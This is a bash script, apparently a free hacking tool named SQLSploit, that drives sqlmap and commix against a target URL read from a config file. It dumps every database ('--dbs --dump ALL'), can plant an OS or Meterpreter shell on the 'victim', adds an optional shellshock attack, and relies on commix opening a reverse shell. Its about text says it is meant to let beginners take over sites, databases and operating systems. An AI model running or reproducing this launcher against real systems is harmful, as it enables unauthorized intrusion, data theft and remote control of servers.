#! /bin/bash

 bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`

clear
## Arguments
localdir=$( pwd )
command=$1
configFile=$2
## SQLmap attack. 
sqlmapAttack(){
	source $configFile
	data="--data='$DATAHEADER'"
	cookie="--cookie='$COOKIE'"
	shelluploader=''
	clear
	echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "|__ SQL Injection Attack"
    echo -e "|____ SQLmap "
    echo -e ""
    echo -e "[+] Checking config file for required parameters..."
    echo -e "---- { Target } ----"
    if [[ -z $TARGET ]]
    then
      echo -e "   x: Seems like the target is missing or empty."
      echo -e "   x: Please fill the target."
      exit 0
    else 
      echo -e "   +: Target is set! adding option to attack...."
      echo -e "     i: Target=$TARGET"
    fi
    echo -e ""
    echo -e "---- { Data Header } ----"
    if [[ -z $DATAHEADER ]]
    then
      echo -e "   !: Data header is empty, skipping data header option..."
      unset data
      Data="Not Set!"
    else
      echo -e "   +: Data header is set! adding option to attack..."
      echo -e "     i: Data Header=$DATAHEADER"
      Data="$DATAHEADER"
    fi
    echo -e ""
    echo -e "---- { Cookie } ----"
    if [[ -z $COOKIE ]]
    then
      echo -e "   !: Cookie is empty, skipping cookie option..."
      unset cookie
      Cookie="Not Set!"
    else
      echo -e "   +: Cookie is set! adding option to attack..."
      echo -e "     i: Cookie=$COOKIE"
      Cookie="$COOKIE"
    fi
    echo -e ""
    echo -e "---- { Shell Upload } ----"
    echo -e "    ?: Before we go any further, would you like SQLSploit to tell to SQLmap to inject a shell uploader into the victim?"
    read -p "    ?: (Y/N): " uploadShell
    echo -e ""
    if [[ $uploadShell == "Y" ]]
    then
      echo -e "---- { Shell Type } ----"
      echo -e "  ?: What type of shell do you want?: "
      echo -e "     [1] OS Shell - Prompt OS Shell-Based." 
      echo -e "     [2] PWN Shell - Prompt Meterpreter, VNC or OBB Shell."
      read -p "  ?: (1,2): " shellType
      if [[ $shellType == "1" ]]
      then
        echo -e "   +: Shell type selected: OS Shell! adding shell upload option..."
        shelluploader='--os-shell'
        shell="OS Shell"
      elif [[ $shellType == "2" ]]
      then
        echo -e "   +: Shell type selected: PWD Shell adding shell upload option..."
        shelluploader='--os-pwn'
        shell="PWN Shell"
      fi
    else 
      echo -e "   i: Shell upload is not selected, skipping shell uploader option..."  
      shell="Not Set!"  
    fi
    sleep 2
    clear
	echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "[+] Ok, everything is set!"
    echo -e "?: Before we continue is all the options below are right?"
    echo -e "   Target : $TARGET"
    echo -e "   Data Header : $Data"
    echo -e "   Cookie : $Cookie"
    echo -e "   Shell : $shell"
    read -p "?: (Y/N): " OptionsGood
    if [[ $OptionsGood == "Y" ]]
    then
      clear
echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    if [[ $uploadShell == "Y" ]]
    then
      if [[ $shellType == "1" ]]
      then
        shellText=" + OS Shell-Based (OS Shell)"
      elif [[ $shellType == "2" ]]
      then
        shellText=" + Metasploit Framework Shell (PWN Shell)"
      fi
    fi
    echo -e "|__ SQL Injection Attack" $shellText
    echo -e "|_ SQLmap "
    echo -e "|_ $TARGET "
    echo -e "|_ $Cookie"
    echo -e "|_ $Data"
    echo -e "|_ $shell "
    echo -e ""
    sqlmap -h >/dev/null 2>&1
    sqlmapInstalled=$?
    if [[ $sqlmapInstalled != "0" ]]
    then
      echo -e "[!] Seems like SQLmap isn't installed on your system!"
      echo -e "  ?: Are you sure its installed?"
      read -p "  ?: (Y/N): " sqlmapInstalled
      if [[ $sqlmapInstalled != "Y" ]]
      then
        echo -e "[!] Quitting!"
        exit 0
      fi
     fi
      echo -e ""
      echo -e "--- { Attacking } ----"
      echo -e "Executing: sqlmap --url="$TARGET" $cookie $data $shelluploader --dbs --dump ALL"  
      sqlmap --url="$TARGET" $cookie $data $shelluploader --dbs --dump ALL
    else
      echo -e "[!] Please re-do the setting steps again..."
      exit 0
    fi
    
}
## END SQLmap attack.

## Commix Attack
commixAttack(){
	source $configFile
	data="--data='$DATAHEADER'"
	cookie="--cookie='$COOKIE'"
	os=""
	shellshock=""
	clear
	echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "|__ OS Command Injection Attack"
    echo -e "|____ Commix "
    echo -e ""
    echo -e "[+] Checking config file for required parameters..."
    echo -e "---- { Target } ----"
    if [[ -z $TARGET ]]
    then
      echo -e "   x: Seems like the target is missing or empty."
      echo -e "   x: Please fill the target."
      exit 0
    else 
      echo -e "   +: Target is set! adding option to attack...."
      echo -e "     i: Target=$TARGET"
    fi
    echo -e ""
    echo -e "---- { Data Header } ----"
    if [[ -z $DATAHEADER ]]
    then
      echo -e "   !: Data header is empty, skipping data header option..."
      unset data
      Data="Not Set!"
    else
      echo -e "   +: Data header is set! adding option to attack..."
      echo -e "     i: Data Header=$DATAHEADER"
      Data="$DATAHEADER"
    fi
    echo -e ""
    echo -e "---- { Cookie } ----"
    if [[ -z $COOKIE ]]
    then
      echo -e "   !: Cookie is empty, skipping cookie option..."
      unset cookie
      Cookie="Not Set!"
    else
      echo -e "   +: Cookie is set! adding option to attack..."
      echo -e "     i: Cookie=$COOKIE"
      Cookie="$COOKIE"
    fi
    echo -e ""
    echo -e "---- { OS } ----"
    echo -e "   ?: To make things much easier, do you know what is the OS of the victim?"
    read -p "   ?: (Y/N): " OsIsKnown
    if [[ $OsIsKnown == "Y" ]]
    then 
      echo -e ""
      echo -e "   ?: Please select what OS is the victim running:"
      echo -e "      [1]. Unix/Linux/MacOS - Linux-Based System"
      echo -e "      [2]. Windows - Windows-Based System"
      read -p "   ?: (1,2): " osType
      if [[ $osType == "1" ]]
      then
        osType="Unix"
        os="--os=$osType"
        echo -e "  +: OS is set! adding option to attack..."
        echo -e "    i: OS Type=$osType "
      elif [[ $osType == "2" ]]
      then
        osType="Windows"
        echo -e "  +: OS is set! adding option to attack..."
        echo -e "    i: OS Type=$osType "
        os="--os=$osType"
      fi
    else
        osType="Unkmowm"
        echo -e "  i: Os is not selected, skipping option..."
    fi
    echo -e ""
    echo -e "---- { Shellshock } ----"
    echo -e "   ?: Shellshock is a vulnerability that allows an attacker to inject much faster and bypass protections, would you like to use it?"
    read -p "   ?: (Y/N): " shellshock2use
    echo -e ""
    if [[ $shellshock2use == "Y" ]]
    then 
      echo -e ""
      shellshock="--shellshock"
      Shellshock="True"
      echo -e "  +: Shellshock is set! adding option to attack..."
      echo -e "    i: Shellshock=$Shellshock"
      echo -e ""
    else
      Shellshock="False"
      echo -e "  i: Shellshock is not selected, skipping option..."
      echo -e ""
    fi
    echo -e "---- { Shell Upload } ----"
    echo -e "    i: Commix will open a reverse shell on the victim after a successfull injection!, so no worries about shells. "
    read -p "    i: Press any key to continue: "
    echo -e ""
    sleep 2
    clear
	echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "[+] Ok, everything is set!"
    echo -e "?: Before we continue is all the options below are right?"
    echo -e "   Target : $TARGET"
    echo -e "   Data Header : $Data"
    echo -e "   Cookie : $Cookie"
    echo -e "   OS : $osType"
    echo -e "   Shellshock : $Shellshock"
    read -p "?: (Y/N): " OptionsGood
    if [[ $OptionsGood == "Y" ]]
    then
      clear
echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "|__ OS Command Injection Attack"
    echo -e "|_ Commix "
    echo -e "|_ $TARGET "
    echo -e "|_ $Cookie"
    echo -e "|_ $Data"
    echo -e "|_ $osType"
    echo -e "|_ $Shellshock"
    echo -e ""
    commix -h >/dev/null 2>&1
    sqlmapInstalled=$?
    if [[ $sqlmapInstalled != "0" ]]
    then
      echo -e "[!] Seems like Commix isn't installed on your system!"
      echo -e "  ?: Are you sure its installed?"
      read -p "  ?: (Y/N): " sqlmapInstalled
      if [[ $sqlmapInstalled != "Y" ]]
      then
        echo -e "[!] Quitting!"
        exit 0
      fi
     fi
      echo -e "--- { Attacking } ----"
      echo -e "Executing: commix --url="$TARGET" $cookie $data $shellshock $os"  
      commix --url="$TARGET" $cookie $data $shellshock $os
    else
      echo -e "[!] Please re-do the setting steps again..."
      exit 0
    fi	
}
## END Commix attack 
ConfChecker(){
	clear
if [[ -z $configFile ]]
 then
   echo -e "[!] Configuration file was not provided..."
   echo -e "  i: Using default file config file... ('$localdir/config/sqlsploit.conf')"
   configFile="$localdir/config/sqlsploit.conf"
   echo -e ""
fi
if [[ -e $configFile ]]
then
  echo -e "   i: File seems to exist..."
else
  echo -e "   x: File does not exist!"
  echo -e "   i: Please re-check your path and try again."
  exit 0
fi
source $configFile
echo -e "[+] Checking file for configuration... This may take a while..."
if [[ $TOOL == "SQLmap" ]]
then
   echo -e "   +: Tool:[$TOOL]"
   echo -e "   +: Preparing SQLmap enviroment..."
   sleep 2
   sqlmapAttack
elif [[ $TOOL == "SQLninja" ]]
then
   echo -e "   !: Sorry SQLninja is not avaible in this version!"
   exit 0   
elif [[ $TOOL == "Commix" ]]
then
   echo -e "   +: Tool:[$TOOL]"
   echo -e "   +: Preparing Commix enviroment..."
   sleep 2
   commixAttack
elif [[ $TOOL == "SQLsus" ]]
then
  echo -e "   !: Sorry SQLninja is not avaible in this version!"
  exit 0
else
  echo -e "   Seems like the choosen config file does not contain a tool for SQLSploit to use..."
  echo -e "   If you were trying to use another tool that SQLSploit doesn't know please report on github issues!"
fi
}
case "$1" in
    --config-file)
    echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
if [[ -z $configFile ]]
 then
   echo -e "[!] Configuration file was not provided..."
   echo -e "  i: Using default file config file... ('$localdir/config/sqlsploit.conf')"
   configFile="$localdir/config/sqlsploit.conf"
   echo -e ""
fi
    echo -e "---- { Configuration File Checking } ----"
    echo -e "[+] SQLSploit is now checking configuration file for any error(s)..."
    echo -e "   +: Configuration File=$configFile"
    if [[ -e $configFile ]]
    then
      echo -e "   i: File seems to exist..."
    else
      echo -e "   x: File does not exist!"
      echo -e "   i: Please re-check your path and try again."
      exit 0
    fi
    echo -e ""
    sleep 2
    fullfile=$configFile
    filename=$(basename -- "$fullfile")
    location=$(dirname -- "$fullfile")
    extension="${filename##*.}"
    filename="${filename%.*}"
    echo -e "---- { File Info } ----"
    echo -e "Filename: $filename"
    echo -e "Extension: $extension"
    echo -e "Location: $location"
    echo -e ""
    echo -e "---- { File Checking } ----"
    echo -e "[+] Checking extension..."
    if [[ $extension != "conf" ]]
    then
      echo -e "   x: Oops, seems like your file isn't on the right format!"   
      echo -e "   i: Do --generate to generate a new configuration file!"
      echo -e "   i: Make sure the file format is: .conf!"
      echo -e ""
      exit 0
    fi
    echo -e "   !: File extension is conf..."
    echo -e ""
    echo -e "--- { File Checking Success } ----"
    echo -e "[+] Configuration file checking is done!"
    echo -e "[+] Calling reading function..."
    sleep 2
    ConfChecker
    ;;
    --generate)
        echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
       generateFile(){
		   if [[ -e $path2save/sqlsploit.conf ]]
		   then
		     source $path2save/sqlsploit.conf
		     echo -e ""
		     echo -e "Seems like an old configuration file is detected."
		     echo -e "Paremeters:"
		     echo -e "  i: Target: $TARGET"
		     echo -e "  i: Data Header: $DATAHEADER"
		     echo -e "  i: Cookie: $COOKIE"
		     echo -e "Woud you like to erase it and replace it?: "
		     read -p "(Y/N): " eraseOldFile
		     if [[ $eraseOldFile == "Y" ]]
		     then
		       echo -e ""
		       echo -e "[+] Erasing old file..."
		       cd $path2save & rm sqlsploit.conf
		       echo -e "  i: Done!"
		     fi
           fi
		   echo -e ""
           echo -e "---- { Generating File } ----"
           echo -e "[+] Generating Chars"
           pwgen 245 1
           echo "
# This is the main file SQLSploit, please configure the file properly!

# The target that SQLSploit will attack/hack.
# You maybe need to put the id and the value for tools to work properly.
# E.g: http://vulnerable.site.org/php?id=value
TARGET='' # Required by: SQLMap, SQLSus, Commix.

# The data header that SQLSploit will use if set.
# E.g: submit&127.0.0.1&submit
DATAHEADER='' # (Optional): SQLMap, Commix

# The cookie that SQLSploit will use if set.
# E.g: PHPIDSSD1DD4ADSAD4DASASD2
COOKIE='' #(Optional) SQLMap, Commix

# The tool that SQLSploit will use.
# Depending on the choosen tool some options wont be used.
# SQLSploit will ignore useless options.
# Here's the supported tools:
# SQLmap - SQL Injection Tool
# Commix - Remote OS Command Injection Tool
# SQLsus - SQL Injection Tool
TOOL=''
" > $path2save/sqlsploit.conf
           echo -e "[!] Done generating"
           echo -e "   !: sqlsploit.conf saved at $path2save/sqlsploit.conf"
	   }
       echo -e "---- { Configuration File Generate } ----"   
       echo -e "[+] Preparing SQLSploit for generating..."   
       echo -e "   ?: Where would you like to save the configuration file?"
       read -p "(PATH): " path2save   
       if [[ -z $path2save ]]
       then
         echo -e "[!] Field is emtpy... setting up to default directory..."
         echo -e "   i: Path to generate=$localdir"
         path2save=$localdir
         generateFile
       else
         echo -e "[+] Checking if directory is avaible..."
         if [[ -e $path2save ]] 
         then
           echo -e "   +: Directory does exist + enough permissions!"
           generateFile
         else
            echo -e "[!] Directory cannot be readen." 
            echo -e "   i: Not enough permissions. (run: chmod 777 SQLSploit.sh) to change permission to root." 
            echo -e "   i: Directory does not exist." 
            exit 0
         fi
       fi
    ;;
    --check-file)
        echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    if [[ -z $configFile ]]
    then
      echo -e "[!] Configuration file was not provided..."
      echo -e "  i: Using default file config file... ('$localdir/config/sqlsploit.conf')"
      configFile="$localdir/config/sqlsploit.conf"
      echo -e ""
    fi
    source $configFile
    if [[ -e $configFile ]]
    then
      echo -e "[+] File seems to exist."
    else
      echo -e "[!] File does not exist!"
      echo -e "   i: Please re-check your file and try again."
      exit 0
    fi
    fullfile=$configFile
    filename=$(basename -- "$fullfile")
    location=$(dirname -- "$fullfile")
    extension="${filename##*.}"
    filename="${filename%.*}"
    echo -e ""
    echo -e "[+] Checking file extension..."
    if [[ $extension != "conf" ]]
    then
       echo -e "   !: File extension is not conf..."
       echo -e "   !: Make sure that the file format is conf!"
       exit 0
    else
       echo -e "   +: File extension is conf!"
    fi
    echo -e ""
    echo -e "---- { Target } ----"
    if [[ -z $TARGET ]]
    then
      echo -e "   x: Seems like the target is missing or empty."
    else 
      echo -e "   +: Target is set!"
      echo -e "     i: Target=$TARGET"
    fi
    echo -e ""
    echo -e "---- { Data Header } ----"
    if [[ -z $DATAHEADER ]]
    then
      echo -e "   !: Data header is empty."
    else
      echo -e "   +: Data header is set!"
      echo -e "     i: Data Header=$DATAHEADER"
    fi
    echo -e ""
    echo -e "---- { Cookie } ----"
    if [[ -z $COOKIE ]]
    then
      echo -e "   !: Cookie is empty."
    else
      echo -e "   +: Cookie is set!"
      echo -e "     i: Cookie=$COOKIE"
    fi
    echo -e ""
    echo -e "---- { Tool } ----"
    if [[ -z $TOOL ]] 
    then
      echo -e "   !: Tool is missing or empty!"
    else
      echo -e "   +: Tool is set!"
      echo -e "     i: Tool=$TOOL"
    fi
    ;;
    --about)
        echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
    echo -e "---- { About SQLSploit } ----"
    echo -e ""
    echo -e "---- { Description } ----"
    echo -e "SQLSploit was made for beginners that doesn't know much about SQL/OS Command Injection, SQLSploit makes injections
easier to perform rather than learning a bunch of commands. SQLSPloit was not made to make money or anything since its a free tool.
SQLSploit does support popular SQL tools as SQLmap and SQLsus. No, Commix is not a SQL Injection tool."
    echo -e ""
    echo -e "---- { Message From Author } ----"
    echo -e "Hello!, its me Ghosty! The creator of SQLSploit, so you downloaded my tool? Thanks, i tried doing a new SQL/OS Command Injection tool
since i didn't see much SQL/OS Command Injection tools. The only third-party tool i found is NoSQLmap. So i though of doing an all-in-on SQL/OS Command injection tool!
Its my most advanced tool so far and yes i know that the config file can be annoying, i could have made it much easier but i saw that SQLsus and SQLninja has
config files that needs to be configure so why not SQLSploit?"
    echo -e ""
    echo -e "---- { Tools description } ----"
    echo -e "SQLmap - SQLmap might be the most popular SQL injection tool, its a good tool that i recommend using!"
    echo -e ""
    echo -e "SQLsus - Another good tool like SQLninja, recommend for advanced/complex SQL injection."
    echo -e ""
    echo -e "Commix - Commix isn't a SQL injection tool, its a OS command injection tool! Used to takeover a site via its OS and not Database unlike SQL."
    echo -e ""
    echo -e "---- { Contact/Support } ----"
    echo -e "[1] Github issues"
    echo -e "[2] Discord: Ghosty #4028"
    echo -e ""
    ;;
    --help)
echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
"
  echo -e "---- { Commands } ----"
  echo -e "--config-file <path> | Leave blank for default file - Sets path for configuration file."
  echo -e "--generate - Generates a new clean configuration file."
  echo -e "--check-file <path> - Checks configuration file."
  echo -e "--about - Displays more about SQLSploit."
  echo -e ""
  echo -e "---- { Example } ----"
  echo -e "sqlsploit --config-file /root/sqlsploit.conf"
  echo -e ""
    ;;
    *)
        echo -e "

███████╗ ██████╗ ██╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██║   ██║██║     ███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██║▄▄ ██║██║     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║ Coded By Ghosty  
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ Version: 1.0.0  
                                                                                                                                          
+--{ 
  SQL Database & OS Remote Command Injection

  'Takeover a SQL Database?, Take full control of an OS?. SQLSploit is for you!'
     - SQLSploit, 2018
+--{
" 
  echo -e "[!] Oops, command does not exist! '$command'"
  echo -e "   i: do ./sqlsploit.sh --help to see help menu!"
  echo -e ""
    ;;
esac






















